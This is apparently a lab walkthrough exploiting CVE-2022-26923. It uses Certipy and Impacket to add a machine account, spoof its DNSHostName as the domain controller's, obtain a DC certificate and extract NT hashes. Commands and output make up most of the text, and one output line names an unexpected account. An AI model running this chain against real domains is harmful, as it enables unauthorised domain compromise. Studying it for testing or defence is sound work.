# CVE-2022-26923
Allows any low-privileged user on the AD domain to elevate their privileges to those of an enterprise domain administrator in a single hop!

## Exploiting the Vulnerability
We will use [Certipy](https://github.com/ly4k/Certipy) for exploitation and the steps to follow are:

1. Compromise the credentials of a low-privileged AD user.

2. Use these credentials to enroll a new host on the domain.

3. Modify the DNS hostname attribute of the computer's AD object to that of a privileged host, such as a domain controller.

4. Remove the assigned SPN to bypass the unique SPN conflict issue.

5. Request a machine certificate using the default template.

6. Perform Kerberos authentication with the received template, now as a privileged machine account instead of our fake machine account.


**Example:** DNS to use in the `/etc/hosts` file

```sh
10.10.17.21 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca.com
```

## Generating Test Certificates
1. Generate a certificate for our low-privileged AD user

```sh
certipy req 'lunar.eruca.com/user:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User

#[*] Successfully requested certificate
#[*] Got certificate with UPN 'user@lunar.eruca.com'
#[*] Saved certificate and private key to 'user.pfx'
```

Verify that this certificate is valid and can also be used for Kerberos authentication:

```sh
certipy auth -pfx user.pfx

#[*] Trying to get TGT...
#[*] Got TGT
#[*] Saved credential cache to 'user.ccache'
#[*] Trying to retrieve NT hash for 'user'
#[*] Got NT hash for 'user@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a
```

> Certipy performs authentication with the certificate and uses Impacket to retrieve the NTLM hash associated with the specified UPN, this at least proves that the certificate is valid and can be used for Kerberos authentication.

2. Adding a computer to the domain

```sh
impacket-addcomputer 'lunar.eruca.com/user:Password1@' -method LDAPS -computer-name 'USERPC' -computer-pass 'Password1@'

#[*] Successfully added machine account USERPC$ with password Password1@.
```

Generate a certificate for the new computer we created.

```sh
certipy req 'lunar.eruca.com/USERPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine

#[*] Successfully requested certificate
#[*] Got certificate with DNS Host Name 'USERPC.lunar.eruca.com'
#[*] Saved certificate and private key to 'userpc.pfx'
```

We can again verify that the certificate is valid using Certipy:

```sh
certipy auth -pfx userpc.pfx

#[*] Trying to get TGT...
#[*] Got TGT
#[*] Saved credential cache to 'userpc.ccache'
#[*] Trying to retrieve NT hash for 'userpc$'
#[*] Got NT hash for 'userpc$@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a
```

We can verify the retrieved NTLM hash against the password we set for the machine account using an [NTLM Generator](https://codebeautify.org/ntlm-hash-generator)



3. Updating DNSHostName and SPN Attributes

```sh
Get-ADComputer USERPC -properties dnshostname,serviceprincipalname
```

Update the `DNSHostName` attribute with that of the domain controller

```sh
Set-ADComputer USERPC -ServicePrincipalName @{}
# Removes the current SPN:

Set-ADComputer USERPC -DnsHostName LUNDC.lunar.eruca.com
# Sets the DNS hostname attribute with that of the domain controller

Get-ADComputer USERPC -properties dnshostname,serviceprincipalname
# Just to verify everything worked
```

5. Forging a Malicious Certificate

Let's run the same Certipy command again to request a new certificate for our computer:

```sh
certipy req 'lunar.eruca.com/USERPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine

#[*] Successfully requested certificate
#[*] Got certificate with DNS Host Name 'LUNDC.lunar.eruca.com'
#[*] Saved certificate and private key to 'lundc.pfx'
```

This time, we noticed something different. Even though we requested a certificate for USERPC, we got a certificate for LUNDC. Let's verify that this certificate works and will return the NTLM hash of the LUNDC machine account instead:

```sh
certipy auth -pfx lundc.pfx

#[*] Trying to get TGT...
#[*] Got TGT
#[*] Saved credential cache to 'lundc.ccache'
#[*] Trying to retrieve NT hash for 'lundc$'
#[*] Got NT hash for 'thmpc$@lunar.eruca.com': <Redacted>
```

> We officially have the NTLM hash for LUNDC's machine account and since LUNDC is a domain controller and we have administrative access to the DC, we have fully compromised the domain in a single hop!
